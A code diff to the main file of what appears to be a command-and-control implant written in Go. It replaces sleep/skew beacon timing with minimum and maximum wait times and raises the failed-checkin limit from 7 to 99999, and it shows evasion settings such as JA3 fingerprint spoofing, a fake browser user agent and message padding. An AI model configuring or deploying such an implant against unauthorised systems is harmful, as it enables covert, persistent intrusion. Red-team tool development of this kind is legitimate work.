@@ -40,10 +40,10 @@ var proxy = ""
 var host = ""
 var ja3 = ""
 var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
-var sleep = "30s"
-var skew = "3000"
+var waittimemin int64 = 15
+var waittimemax int64 = 30
 var killdate = "0"
-var maxretry = "7"
+var maxretry = "99999"
 var padding = "4096"
 var opaque []byte
 
@@ -57,8 +57,8 @@ func main() {
 	flag.StringVar(&proxy, "proxy", proxy, "Hardcoded proxy to use for http/1.1 traffic only that will override host configuration")
 	flag.StringVar(&host, "host", host, "HTTP Host header")
 	flag.StringVar(&ja3, "ja3", ja3, "JA3 signature string (not the MD5 hash). Overrides -proto flag")
-	flag.StringVar(&sleep, "sleep", sleep, "Time for agent to sleep")
-	flag.StringVar(&skew, "skew", skew, "Amount of skew, or variance, between agent checkins")
+	flag.Int64Var(&waittimemin, "waittimemin", waittimemin, "Minimum time for agent to sleep")
+	flag.Int64Var(&waittimemax, "waittimemax", waittimemax, "Maximum time for agent to sleep")
 	flag.StringVar(&killdate, "killdate", killdate, "The date, as a Unix EPOCH timestamp, that the agent will quit running")
 	flag.StringVar(&maxretry, "maxretry", maxretry, "The maximum amount of failed checkins before the agent will quit running")
 	flag.StringVar(&padding, "padding", padding, "The maximum amount of data that will be randomly selected and appended to every message")
@@ -78,10 +78,10 @@ func main() {
 
 	// Setup and run agent
 	agentConfig := agent.Config{
-		Sleep:    sleep,
-		Skew:     skew,
-		KillDate: killdate,
-		MaxRetry: maxretry,
+		WaitTimeMin: waittimemin,
+		WaitTimeMax: waittimemax,
+		KillDate:    killdate,
+		MaxRetry:    maxretry,
 	}
 	a, err := agent.New(agentConfig)
 	if err != nil {
